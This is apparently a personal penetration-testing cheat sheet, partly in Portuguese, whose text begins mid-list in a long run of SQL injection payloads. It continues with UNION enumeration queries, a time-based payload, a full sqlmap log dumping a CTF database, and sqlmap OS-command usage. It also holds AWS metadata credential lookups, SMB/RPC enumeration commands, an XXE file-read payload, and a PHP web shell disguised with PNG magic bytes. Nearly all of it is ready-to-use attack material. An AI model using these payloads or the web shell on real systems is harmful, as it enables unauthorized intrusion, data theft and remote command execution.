                admin' and substring(password/text(),1,1)='7
                ' and substring(password/text(),1,1)='7
                "
                '-- 2
                "-- 2
                '='
                0'&lt;'2
                "="
                0"&lt;"2
                ')
                ")
                ')-- 2
                ')/*
                ')#
                ")-- 2
                ") #
                ")/*
                ')-('
                ')&('
                ')^('
                ')*('
                ')=('
                0')&lt;('2
                ")-("
                ")&("
                ")^("
                ")*("
                ")=("
                0")&lt;("2
                '-''-- 2
                '-''#
                '-''/*
                '&''-- 2
                '&''#
                '&''/*
                '^''-- 2
                '^''#
                '^''/*
                '*''-- 2
                '*''#
                '*''/*
                '=''-- 2
                '=''#
                '=''/*
                0'&lt;'2'-- 2
                0'&lt;'2'#
                0'&lt;'2'/*
                "-""-- 2
                "-""#
                "-""/*
                "&""-- 2
                "&""#
                "&""/*
                "^""-- 2
                "^""#
                "^""/*
                "*""-- 2
                "*""#
                "*""/*
                "=""-- 2
                "=""#
                "=""/*
                0"&lt;"2"-- 2
                0"&lt;"2"#
                0"&lt;"2"/*
                ')-''-- 2
                ')-''#
                ')-''/*
                ')&''-- 2
                ')&''#
                ')&''/*
                ')^''-- 2
                ')^''#
                ')^''/*
                ')*''-- 2
                ')*''#
                ')*''/*
                ')=''-- 2
                ')=''#
                ')=''/*
                0')&lt;'2'-- 2
                0')&lt;'2'#
                0')&lt;'2'/*
                ")-""-- 2
                ")-""#
                ")-""/*
                ")&""-- 2
                ")&""#
                ")&""/*
                ")^""-- 2
                ")^""#
                ")^""/*
                ")*""-- 2
                ")*""#
                ")*""/*
                ")=""-- 2
                ")=""#
                ")=""/*
                0")&lt;"2-- 2
                0")&lt;"2#
                0")&lt;"2/*
                'oR'2
                'oR'2'-- 2
                'oR'2'#
                'oR'2'/*
                'oR'2'oR'
                'oR(2)-- 2
                'oR(2)#
                'oR(2)/*
                'oR(2)oR'
                'oR 2-- 2
                'oR 2#
                'oR 2/*
                'oR 2 oR'
                'oR/**/2-- 2
                'oR/**/2#
                'oR/**/2/*
                'oR/**/2/**/oR'
                "oR"2
                "oR"2"-- 2
                "oR"2"#
                "oR"2"/*
                "oR"2"oR"
                "oR(2)-- 2
                "oR(2)#
                "oR(2)/*
                "oR(2)oR"
                "oR 2-- 2
                "oR 2#
                "oR 2/*
                "oR 2 oR"
                "oR/**/2-- 2
                "oR/**/2#
                "oR/**/2/*
                "oR/**/2/**/oR"
                'oR'2'='2
                'oR'2'='2'oR'
                'oR'2'='2'-- 2
                'oR'2'='2'#
                'oR'2'='2'/*
                'oR 2=2-- 2
                'oR 2=2#
                'oR 2=2/*
                'oR 2=2 oR'
                'oR/**/2=2-- 2
                'oR/**/2=2#
                'oR/**/2=2/*
                'oR/**/2=2/**/oR'
                'oR(2)=2-- 2
                'oR(2)=2#
                'oR(2)=2/*
                'oR(2)=(2)oR'
                'oR'2'='2' LimIT 1-- 2
                'oR'2'='2' LimIT 1#
                'oR'2'='2' LimIT 1/*
                'oR(2)=(2)LimIT(1)-- 2
                'oR(2)=(2)LimIT(1)#
                'oR(2)=(2)LimIT(1)/*
                "oR"2"="2
                "oR"2"="2"oR"
                "oR"2"="2"-- 2
                "oR"2"="2"#
                "oR"2"="2"/*
                "oR 2=2-- 2
                "oR 2=2#
                "oR 2=2/*
                "oR 2=2 oR"
                "oR/**/2=2-- 2
                "oR/**/2=2#
                "oR/**/2=2/*
                "oR/**/2=2/**/oR"
                "oR(2)=2-- 2
                "oR(2)=2#
                "oR(2)=2/*
                "oR(2)=(2)oR"
                "oR"2"="2" LimIT 1-- 2
                "oR"2"="2" LimIT 1#
                "oR"2"="2" LimIT 1/*
                "oR(2)=(2)LimIT(1)-- 2
                "oR(2)=(2)LimIT(1)#
                "oR(2)=(2)LimIT(1)/*
                'oR true-- 2
                'oR true#
                'oR true/*
                'oR true oR'
                'oR(true)-- 2
                'oR(true)#
                'oR(true)/*
                'oR(true)oR'
                'oR/**/true-- 2
                'oR/**/true#
                'oR/**/true/*
                'oR/**/true/**/oR'
                "oR true-- 2
                "oR true#
                "oR true/*
                "oR true oR"
                "oR(true)-- 2
                "oR(true)#
                "oR(true)/*
                "oR(true)oR"
                "oR/**/true-- 2
                "oR/**/true#
                "oR/**/true/*
                "oR/**/true/**/oR"
                'oR'2'LiKE'2
                'oR'2'LiKE'2'-- 2
                'oR'2'LiKE'2'#
                'oR'2'LiKE'2'/*
                'oR'2'LiKE'2'oR'
                'oR(2)LiKE(2)-- 2
                'oR(2)LiKE(2)#
                'oR(2)LiKE(2)/*
                'oR(2)LiKE(2)oR'
                "oR"2"LiKE"2
                "oR"2"LiKE"2"-- 2
                "oR"2"LiKE"2"#
                "oR"2"LiKE"2"/*
                "oR"2"LiKE"2"oR"
                "oR(2)LiKE(2)-- 2
                "oR(2)LiKE(2)#
                "oR(2)LiKE(2)/*
                "oR(2)LiKE(2)oR"
                admin
                admin'-- 2
                admin'#
                admin"-- 2
                admin"#
                ffifdyop
                ' UniON SElecT 1,2-- 2
                ' UniON SElecT 1,2,3-- 2
                ' UniON SElecT 1,2,3,4-- 2
                ' UniON SElecT 1,2,3,4,5-- 2
                ' UniON SElecT 1,2#
                ' UniON SElecT 1,2,3#
                ' UniON SElecT 1,2,3,4#
                ' UniON SElecT 1,2,3,4,5#
                'UniON(SElecT(1),2)-- 2
                'UniON(SElecT(1),2,3)-- 2
                'UniON(SElecT(1),2,3,4)-- 2
                'UniON(SElecT(1),2,3,4,5)-- 2
                'UniON(SElecT(1),2)#
                'UniON(SElecT(1),2,3)#
                'UniON(SElecT(1),2,3,4)#
                'UniON(SElecT(1),2,3,4,5)#
                " UniON SElecT 1,2-- 2
                " UniON SElecT 1,2,3-- 2
                " UniON SElecT 1,2,3,4-- 2
                " UniON SElecT 1,2,3,4,5-- 2
                " UniON SElecT 1,2#
                " UniON SElecT 1,2,3#
                " UniON SElecT 1,2,3,4#
                " UniON SElecT 1,2,3,4,5#
                "UniON(SElecT(1),2)-- 2
                "UniON(SElecT(1),2,3)-- 2
                "UniON(SElecT(1),2,3,4)-- 2
                "UniON(SElecT(1),2,3,4,5)-- 2
                "UniON(SElecT(1),2)#
                "UniON(SElecT(1),2,3)#
                "UniON(SElecT(1),2,3,4)#
                "UniON(SElecT(1),2,3,4,5)#
                '||'2
                '||2-- 2
                '||'2'||'
                '||2#
                '||2/*
                '||2||'
                "||"2
                "||2-- 2
                "||"2"||"
                "||2#
                "||2/*
                "||2||"
                '||'2'='2
                '||'2'='2'||'
                '||2=2-- 2
                '||2=2#
                '||2=2/*
                '||2=2||'
                "||"2"="2
                "||"2"="2"||"
                "||2=2-- 2
                "||2=2#
                "||2=2/*
                "||2=2||"
                '||2=(2)LimIT(1)-- 2
                '||2=(2)LimIT(1)#
                '||2=(2)LimIT(1)/*
                "||2=(2)LimIT(1)-- 2
                "||2=(2)LimIT(1)#
                "||2=(2)LimIT(1)/*
                '||true-- 2
                '||true#
                '||true/*
                '||true||'
                "||true-- 2
                "||true#
                "||true/*
                "||true||"
                '||'2'LiKE'2
                '||'2'LiKE'2'-- 2
                '||'2'LiKE'2'#
                '||'2'LiKE'2'/*
                '||'2'LiKE'2'||'
                '||(2)LiKE(2)-- 2
                '||(2)LiKE(2)#
                '||(2)LiKE(2)/*
                '||(2)LiKE(2)||'
                "||"2"LiKE"2
                "||"2"LiKE"2"-- 2
                "||"2"LiKE"2"#
                "||"2"LiKE"2"/*
                "||"2"LiKE"2"||"
                "||(2)LiKE(2)-- 2
                "||(2)LiKE(2)#
                "||(2)LiKE(2)/*
                "||(2)LiKE(2)||"
                ')oR('2
                ')oR'2'-- 2
                ')oR'2'#
                ')oR'2'/*
                ')oR'2'oR('
                ')oR(2)-- 2
                ')oR(2)#
                ')oR(2)/*
                ')oR(2)oR('
                ')oR 2-- 2
                ')oR 2#
                ')oR 2/*
                ')oR 2 oR('
                ')oR/**/2-- 2
                ')oR/**/2#
                ')oR/**/2/*
                ')oR/**/2/**/oR('
                ")oR("2
                ")oR"2"-- 2
                ")oR"2"#
                ")oR"2"/*
                ")oR"2"oR("
                ")oR(2)-- 2
                ")oR(2)#
                ")oR(2)/*
                ")oR(2)oR("
                ")oR 2-- 2
                ")oR 2#
                ")oR 2/*
                ")oR 2 oR("
                ")oR/**/2-- 2
                ")oR/**/2#
                ")oR/**/2/*
                ")oR/**/2/**/oR("
                ')oR'2'=('2
                ')oR'2'='2'oR('
                ')oR'2'='2'-- 2
                ')oR'2'='2'#
                ')oR'2'='2'/*
                ')oR 2=2-- 2
                ')oR 2=2#
                ')oR 2=2/*
                ')oR 2=2 oR('
                ')oR/**/2=2-- 2
                ')oR/**/2=2#
                ')oR/**/2=2/*
                ')oR/**/2=2/**/oR('
                ')oR(2)=2-- 2
                ')oR(2)=2#
                ')oR(2)=2/*
                ')oR(2)=(2)oR('
                ')oR'2'='2' LimIT 1-- 2
                ')oR'2'='2' LimIT 1#
                ')oR'2'='2' LimIT 1/*
                ')oR(2)=(2)LimIT(1)-- 2
                ')oR(2)=(2)LimIT(1)#
                ')oR(2)=(2)LimIT(1)/*
                ")oR"2"=("2
                ")oR"2"="2"oR("
                ")oR"2"="2"-- 2
                ")oR"2"="2"#
                ")oR"2"="2"/*
                ")oR 2=2-- 2
                ")oR 2=2#
                ")oR 2=2/*
                ")oR 2=2 oR("
                ")oR/**/2=2-- 2
                ")oR/**/2=2#
                ")oR/**/2=2/*
                ")oR/**/2=2/**/oR("
                ")oR(2)=2-- 2
                ")oR(2)=2#
                ")oR(2)=2/*
                ")oR(2)=(2)oR("
                ")oR"2"="2" LimIT 1-- 2
                ")oR"2"="2" LimIT 1#
                ")oR"2"="2" LimIT 1/*
                ")oR(2)=(2)LimIT(1)-- 2
                ")oR(2)=(2)LimIT(1)#
                ")oR(2)=(2)LimIT(1)/*
                ')oR true-- 2
                ')oR true#
                ')oR true/*
                ')oR true oR('
                ')oR(true)-- 2
                ')oR(true)#
                ')oR(true)/*
                ')oR(true)oR('
                ')oR/**/true-- 2
                ')oR/**/true#
                ')oR/**/true/*
                ')oR/**/true/**/oR('
                ")oR true-- 2
                ")oR true#
                ")oR true/*
                ")oR true oR("
                ")oR(true)-- 2
                ")oR(true)#
                ")oR(true)/*
                ")oR(true)oR("
                ")oR/**/true-- 2
                ")oR/**/true#
                ")oR/**/true/*
                ")oR/**/true/**/oR("
                ')oR'2'LiKE('2
                ')oR'2'LiKE'2'-- 2
                ')oR'2'LiKE'2'#
                ')oR'2'LiKE'2'/*
                ')oR'2'LiKE'2'oR('
                ')oR(2)LiKE(2)-- 2
                ')oR(2)LiKE(2)#
                ')oR(2)LiKE(2)/*
                ')oR(2)LiKE(2)oR('
                ")oR"2"LiKE("2
                ")oR"2"LiKE"2"-- 2
                ")oR"2"LiKE"2"#
                ")oR"2"LiKE"2"/*
                ")oR"2"LiKE"2"oR("
                ")oR(2)LiKE(2)-- 2
                ")oR(2)LiKE(2)#
                ")oR(2)LiKE(2)/*
                ")oR(2)LiKE(2)oR("
                admin')-- 2
                admin')#
                admin')/*
                admin")-- 2
                admin")#
                ') UniON SElecT 1,2-- 2
                ') UniON SElecT 1,2,3-- 2
                ') UniON SElecT 1,2,3,4-- 2
                ') UniON SElecT 1,2,3,4,5-- 2
                ') UniON SElecT 1,2#
                ') UniON SElecT 1,2,3#
                ') UniON SElecT 1,2,3,4#
                ') UniON SElecT 1,2,3,4,5#
                ')UniON(SElecT(1),2)-- 2
                ')UniON(SElecT(1),2,3)-- 2
                ')UniON(SElecT(1),2,3,4)-- 2
                ')UniON(SElecT(1),2,3,4,5)-- 2
                ')UniON(SElecT(1),2)#
                ')UniON(SElecT(1),2,3)#
                ')UniON(SElecT(1),2,3,4)#
                ')UniON(SElecT(1),2,3,4,5)#
                ") UniON SElecT 1,2-- 2
                ") UniON SElecT 1,2,3-- 2
                ") UniON SElecT 1,2,3,4-- 2
                ") UniON SElecT 1,2,3,4,5-- 2
                ") UniON SElecT 1,2#
                ") UniON SElecT 1,2,3#
                ") UniON SElecT 1,2,3,4#
                ") UniON SElecT 1,2,3,4,5#
                ")UniON(SElecT(1),2)-- 2
                ")UniON(SElecT(1),2,3)-- 2
                ")UniON(SElecT(1),2,3,4)-- 2
                ")UniON(SElecT(1),2,3,4,5)-- 2
                ")UniON(SElecT(1),2)#
                ")UniON(SElecT(1),2,3)#
                ")UniON(SElecT(1),2,3,4)#
                ")UniON(SElecT(1),2,3,4,5)#
                ')||('2
                ')||2-- 2
                ')||'2'||('
                ')||2#
                ')||2/*
                ')||2||('
                ")||("2
                ")||2-- 2
                ")||"2"||("
                ")||2#
                ")||2/*
                ")||2||("
                ')||'2'=('2
                ')||'2'='2'||('
                ')||2=2-- 2
                ')||2=2#
                ')||2=2/*
                ')||2=2||('
                ")||"2"=("2
                ")||"2"="2"||("
                ")||2=2-- 2
                ")||2=2#
                ")||2=2/*
                ")||2=2||("
                ')||2=(2)LimIT(1)-- 2
                ')||2=(2)LimIT(1)#
                ')||2=(2)LimIT(1)/*
                ")||2=(2)LimIT(1)-- 2
                ")||2=(2)LimIT(1)#
                ")||2=(2)LimIT(1)/*
                ')||true-- 2
                ')||true#
                ')||true/*
                ')||true||('
                ")||true-- 2
                ")||true#
                ")||true/*
                ")||true||("
                ')||'2'LiKE('2
                ')||'2'LiKE'2'-- 2
                ')||'2'LiKE'2'#
                ')||'2'LiKE'2'/*
                ')||'2'LiKE'2'||('
                ')||(2)LiKE(2)-- 2
                ')||(2)LiKE(2)#
                ')||(2)LiKE(2)/*
                ')||(2)LiKE(2)||('
                ")||"2"LiKE("2
                ")||"2"LiKE"2"-- 2
                ")||"2"LiKE"2"#
                ")||"2"LiKE"2"/*
                ")||"2"LiKE"2"||("
                ")||(2)LiKE(2)-- 2
                ")||(2)LiKE(2)#
                ")||(2)LiKE(2)/*
                ")||(2)LiKE(2)||("
                ' UnION SELeCT 1,2`
                ' UnION SELeCT 1,2,3`
                ' UnION SELeCT 1,2,3,4`
                ' UnION SELeCT 1,2,3,4,5`
                " UnION SELeCT 1,2`
                " UnION SELeCT 1,2,3`
                " UnION SELeCT 1,2,3,4`
                " UnION SELeCT 1,2,3,4,5`
                ' or 1=1 limit 1 -- -+
                '="or'
                Pass1234.
                Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658
                Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658'#
                Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.
                Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.')#
                Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61
                Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61'#
                Pass1234.' and 1=0 union select 'admin',sha('Pass1234.
                Pass1234.' and 1=0 union select 'admin',sha('Pass1234.')#
                Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658
                Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658"#
                Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.
                Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#
                Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61
                Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#
                Pass1234." and 1=0 union select "admin",sha("Pass1234.
                Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
                %A8%27 Or 1=1-- 2
                %8C%A8%27 Or 1=1-- 2
                %bf' Or 1=1 -- 2
                %A8%27 Or 1-- 2
                %8C%A8%27 Or 1-- 2
                %bf' Or 1-- 2
                %A8%27Or(1)-- 2
                %8C%A8%27Or(1)-- 2
                %bf'Or(1)-- 2
                %A8%27||1-- 2
                %8C%A8%27||1-- 2
                %bf'||1-- 2
                %A8%27) Or 1=1-- 2
                %8C%A8%27) Or 1=1-- 2
                %bf') Or 1=1 -- 2
                %A8%27) Or 1-- 2
                %8C%A8%27) Or 1-- 2
                %bf') Or 1-- 2
                %A8%27)Or(1)-- 2
                %8C%A8%27)Or(1)-- 2
                %bf')Or(1)-- 2
                %A8%27)||1-- 2
                %8C%A8%27)||1-- 2
                %bf')||1-- 2
                ```
                
        - UNIONS
            - Enumerando colunas - (verifique quantos campos são necessários, para o union funcionar as duas consultas devem ter a mesma quantidade de colunas retornadas
                
                ```markdown
                +UNION+SELECT+NULL,NULL,NULL—+-
                ```
                
                Order by também funciona:
                
                ```bash
                ticket?id=1 AND 1=1 ORDER by 4
                ```
                
                Exemplo:
                
                ```markdown
                admin'+or+1=1+UNION+SELECT+username+from+admins--+-
                ```
                
            - Trazendo versão do banco:
                - Mysql
                    
                    ```bash
                    UNION+SELECT+version(),null,null -- -
                    
                    UNION SELECT version(),null -- -
                    ```
                    
                - Oracle
                    
                    ```php
                    SELECT version FROM v$instance;
                    
                    'UNION+SELECT+banner,NULL+FROM+v$version-- 
                    'UNION+SELECT+version,NULL+FROM+v$version--
                    
                    'UNION SELECT version,NULL FROM v$version -- -
                    ```
                    
                - Postgres
                    
                    ```php
                    SELECT version();
                    ```
                    
                - SQLServer
                    
                    ```php
                    SELECT @@VERSION;
                    ```
                    
                - MongoDB:
                    
                    ```php
                    db.version()
                    ```
                    
            - Trazendo nomes das tabelas
                - Mysql
                    
                    ```bash
                    UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() -- -
                    ```
                    
            - Trazendo colunas da tabela
                - Mysql
                    
                    ```bash
                    UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users'--
                    ```
                    
            - Lendo arquivos com UNION
                
                ```bash
                id=4 UNION SELECT 'files/adorable.jpg'--
                ```
                
            - Alterando registro
                
                ```bash
                UPDATE photos SET filename=";env > list.txt" where id=3 ;commit;--
                ```
                
            - Criando registro
                
                ```php
                INSERT INTO users (username, password) VALUES ('alice', 'absolem'); -- -
                ```
                
        - Time-based
            
            ```php
            admin" AND (SELECT 9936 FROM (SELECT(SLEEP(5)))xWxn)-- -
            ```
            
        - sqlmap
            - Resultados
                
                ```bash
                [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
                
                [*] starting @ 08:16:28 /2023-04-24/
                
                [08:16:28] [INFO] testing connection to the target URL
                [08:16:33] [INFO] testing if the target URL content is stable
                [08:16:36] [INFO] target URL content is stable
                [08:16:37] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
                [08:16:38] [INFO] testing for SQL injection on GET parameter 'id'
                [08:16:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
                [08:16:44] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
                [08:16:50] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'Microsoft Access' 
                it looks like the back-end DBMS is 'Microsoft Access'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
                for the remaining tests, do you want to include all tests for 'Microsoft Access' extending provided level (1) and risk (1) values? [Y/n] Y
                [08:16:50] [INFO] testing 'Generic inline queries'
                [08:16:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
                [08:16:51] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
                [08:17:07] [INFO] checking if the injection point on GET parameter 'id' is a false positive
                GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
                sqlmap identified the following injection point(s) with a total of 36 HTTP(s) requests:
                ---
                Parameter: id (GET)
                    Type: boolean-based blind
                    Title: AND boolean-based blind - WHERE or HAVING clause
                    Payload: id=2 AND 7300=7300
                ---
                [08:17:23] [INFO] testing Microsoft Access
                [08:17:24] [WARNING] the back-end DBMS is not Microsoft Access
                [08:17:24] [INFO] testing MySQL
                [08:17:26] [INFO] confirming MySQL
                [08:17:31] [INFO] the back-end DBMS is MySQL
                web application technology: OpenResty 1.21.4.1
                back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
                [08:17:33] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
                [08:17:33] [INFO] fetching current database
                [08:17:33] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
                [08:17:33] [INFO] retrieved: level5
                [08:18:37] [INFO] fetching tables for database: 'level5'
                [08:18:37] [INFO] fetching number of tables for database 'level5'
                [08:18:37] [INFO] retrieved: 2
                [08:18:44] [INFO] retrieved: albums
                [08:20:23] [INFO] retrieved: photos
                [08:21:41] [INFO] fetching columns for table 'photos' in database 'level5'
                [08:21:41] [INFO] retrieved: 4
                [08:21:47] [INFO] retrieved: id
                [08:22:17] [INFO] retrieved: title
                [08:23:20] [INFO] retrieved: filename
                [08:24:52] [INFO] retrieved: parent
                [08:26:26] [INFO] fetching entries for table 'photos' in database 'level5'
                [08:26:26] [INFO] fetching number of entries for table 'photos' in database 'level5'
                [08:26:26] [INFO] retrieved: 3
                [08:26:41] [INFO] retrieved: files/adorable.jpg
                [08:30:26] [INFO] retrieved: 1
                [08:30:37] [INFO] retrieved: 1
                [08:30:48] [INFO] retrieved: Utterly adorable
                [08:34:12] [INFO] retrieved: files/purrfect.jpg
                [08:38:10] [INFO] retrieved: 2
                [08:38:27] [INFO] retrieved: 1
                [08:38:37] [INFO] retrieved: Purrfect
                [08:40:24] [INFO] retrieved: 7aeb980c8f4c0f954969bbe9e2e641c9e58a4f4f1be4d3b8b62ff695f9fcce52
                [08:55:43] [INFO] retrieved: 3
                [08:55:55] [INFO] retrieved: 1
                [08:56:08] [INFO] retrieved: Invisible
                [08:57:45] [INFO] recognized possible password hashes in column 'filename'
                do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
                do you want to crack them via a dictionary-based attack? [Y/n/q] Y
                [08:57:45] [INFO] using hash method 'sha256_generic_passwd'
                what dictionary do you want to use?
                [1] default dictionary file '/home/lsaldanha/.local/lib/python3.10/site-packages/sqlmap/data/txt/wordlist.tx_' (press Enter)
                [2] custom dictionary file
                [3] file with list of dictionary files
                > 1
                [08:57:45] [INFO] using default dictionary
                do you want to use common password suffixes? (slow!) [y/N] N
                [08:57:45] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
                [08:57:45] [INFO] starting 8 processes 
                [08:57:52] [WARNING] no clear password(s) found                                       
                Database: level5
                Table: photos
                [3 entries]
                +----+------------------+--------+------------------------------------------------------------------+
                | id | title            | parent | filename                                                         |
                +----+------------------+--------+------------------------------------------------------------------+
                | 1  | Utterly adorable | 1      | files/adorable.jpg                                               |
                | 2  | Purrfect         | 1      | files/purrfect.jpg                                               |
                | 3  | Invisible        | 1      | 7aeb980c8f4c0f954969bbe9e2e641c9e58a4f4f1be4d3b8b62ff695f9fcce52 |
                +----+------------------+--------+------------------------------------------------------------------+
                
                [08:57:52] [INFO] table 'level5.photos' dumped to CSV file '/home/lsaldanha/.local/share/sqlmap/output/0ccbdce07db99afe41d457172af110b7.ctf.hacker101.com/dump/level5/photos.csv'
                [08:57:52] [INFO] fetching columns for table 'albums' in database 'level5'
                [08:57:52] [INFO] retrieved: 2
                [08:58:04] [INFO] retrieved: id
                [08:58:27] [INFO] retrieved: title
                [08:59:42] [INFO] fetching entries for table 'albums' in database 'level5'
                [08:59:42] [INFO] fetching number of entries for table 'albums' in database 'level5'
                [08:59:42] [INFO] retrieved: 1
                [08:59:54] [INFO] retrieved: 1
                [09:00:04] [INFO] retrieved: Kittens
                Database: level5
                Table: albums
                [1 entry]
                +----+---------+
                | id | title   |
                +----+---------+
                | 1  | Kittens |
                +----+---------+
                
                [09:02:04] [INFO] table 'level5.albums' dumped to CSV file '/home/lsaldanha/.local/share/sqlmap/output/0ccbdce07db99afe41d457172af110b7.ctf.hacker101.com/dump/level5/albums.csv'
                [09:02:04] [WARNING] HTTP error codes detected during run:
                500 (Internal Server Error) - 29 times, 404 (Not Found) - 742 times
                [09:02:04] [INFO] fetched data logged to text files under '/home/lsaldanha/.local/share/sqlmap/output/0ccbdce07db99afe41d457172af110b7.ctf.hacker101.com'
                
                [*] ending @ 09:02:04 /2023-04-24/
                ```
                
            - Basicos
                
                ```bash
                sqlmap -u https://53252d0c89bf0a90652f6b8f0d4742a9.ctf.hacker101.com/login --data 'username=admin&password=paokpok' --batch --dump
                ```
                
                ```bash
                sqlmap -u "https://$host/fetch?id=2" -p id --batch --dump
                ```
                
                ```php
                sqlmap --random-agent --header "Authorization: Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==" -u http://natas15.natas.labs.overthewire.org/index.php/?debug=yes --data 'username=admin"' -p username --batch --dump
                ```
                
            - Exploitation
                
                ```bash
                sqlmap -u "https://$host/fetch?id=2" --os-cmd whoami --batch
                ```
                
                ```bash
                sqlmap -u "https://$host/fetch?id=2" --hostname --batch
                ```
                
    - Crypto weaks?
        - Padding attack
            - [PadBuster](https://github.com/AonCyberLabs/PadBuster)
                
                ```markdown
                ./padBuster.pl https://860c7e8b46bb4d6bef805a5495bfdd7f.ctf.hacker101.com/?post=pN9KnGLjw9YSpPPwqvUrsH4i99Nl0I56R8HM8kFSQn4lxoBX1wa67xveErauebpb88cTa8jCQ9Pg8T6p3VrBE00aVptEsXNfg4fwdhJ1iD1yUsGvWUA/F4/VOzlDIrd5FtBpD1c1216nI4qsWBeGgbBJSXujRVo5tpo7mCBLcAdjAYuJg73V/qu2gDiBBxso4snvGy4LuFIJ4WhSSS6soQ== pN9KnGLjw9YSpPPwqvUrsH4i99Nl0I56R8HM8kFSQn4lxoBX1wa67xveErauebpb88cTa8jCQ9Pg8T6p3VrBE00aVptEsXNfg4fwdhJ1iD1yUsGvWUA/F4/VOzlDIrd5FtBpD1c1216nI4qsWBeGgbBJSXujRVo5tpo7mCBLcAdjAYuJg73V/qu2gDiBBxso4snvGy4LuFIJ4WhSSS6soQ== 16 -encoding 0
                ```
                
        - keytool (.jks)
            - Listando certificados (e alias)
                
                ```bash
                keytool -list -v -keystore ssl.jks
                ```
                
            - Exportando certificado
                
                ```bash
                keytool -export -rfc -file ssl_montevideo.pem -keystore Downloads/ssl.jks -alias juanc
                ```
                
            
    - AWS?
        - Recuperando metadados
            
            ```bash
            http://169.254.169.254/latest/meta-data/iam/security-credentials/
            ```
            
        - Verifica informações basicas de numero da conta e usuario
            - aws sts get-caller-identity
            
            ```markdown
            {
                "UserId": "AROA6EN532ETAD7KD74UL:i-023d5a86a838ff766",
                "Account": "971597664550",
                "Arn": "arn:aws:sts::971597664550:assumed-role/pagseguroAtlantisEc2Role/i-023d5a86a838ff766"
            }
            ```
            
        - Verifica privilegios do usuario
            - aws iam list-permissions-boundary-policies --user-name <seu-nome-de-usuario>
        - Cria ec2
            
            ```markdown
            aws ec2 run-instances --image-id ami-0fc61db8544a617ed --count 1 --instance-type t2.micro --key-name mykey --security-group-ids sg-0123456789abcdef --subnet-id subnet-0123456789abcdef --block-device-mappings DeviceName=/dev/xvda,Ebs={VolumeSize=8} --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=my-ec2-instance}]' --user-data file://my-ec2-userdata.sh
            ```
            
        - Busca por imagens-id
            - **aws ec2 describe-images**
                
                ```markdown
                
                ```
                
            - aws ec2 describe-images --owners amazon --filters "Name=name,Values=ubuntu*" "Name=architecture,Values=x86_64" "Name=virtualization-type,Values=hvm”
    - RPC?
        - smbclient
            
            ```markdown
            sudo smbclient -h
            sudo smbclient --list=10.10.11.102
            sudo smbclient --no-pass --list=10.10.11.10
            ```
            
        - crackmapexec
            
            ```markdown
            sudo crackmapexec -h
            sudo crackmapexec smb -h
            sudo crackmapexec smb 10.10.11.102
            ```
            
        - smbmap
            
            ```markdown
            sudo smbmap -h
            sudo smbmap -H 10.10.11.102
            sudo smbmap -H 10.10.11.102 -u vonnie
            sudo smbmap -H 10.10.11.102 -u '' -p ''
            ```
            
        - rpcdump
            
            ```markdown
            sudo rpcdump.py -h
            sudo rpcdump.py windcorp.htb/administrator@10.10.11.102 -debug
            ```
            
        - rpcclient
            
            ```markdown
            
            sudo rpcclient -h
            sudo rpcclient --user='' --no-pass 10.10.11.102
            help
            srvinfo
            netshareenumall
            enumdomusers
            enumdomgroups
            getdcname windcorp
            ```
            
    - Upload?
        - XXE.xml
            - Generic Payload
                
                ```bash
                <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "/etc/passwd">]><config><location>&xxe;</location></config>
                ```
                
        - Fake jpg (Crie um arquivo php com o nome fake.jpg)
            
            ```bash
            <?php echo system("cat /etc/natas_webpass/natas13"); ?>"
            ```
            
        - Tampering Magic Numbers
            - Se a aplicação faz validação se o arquivo é uma imagem, tente bypassar colocando magic numbers no começo do arquivo:
                - png
                    
                    ```bash
                    printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > imagem_with_magic_number_png.php
                    ```
                    
                    ```php
                    �PNG
                    �
                    <html>
                    <body>
                    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
                    <input type="TEXT" name="cmd" id="cmd" size="80">
                    <input type="SUBMIT" value="Execute">
                    </form>
                    <pre>
                    <?php
                        if(isset($_GET['cmd']))
                        {
                            system($_GET['cmd']);
                        }
                    ?>
                    </pre>
                    </body>
                    <script>document.getElementById("cmd").focus();</script>
                    </html>
                    ```
                    
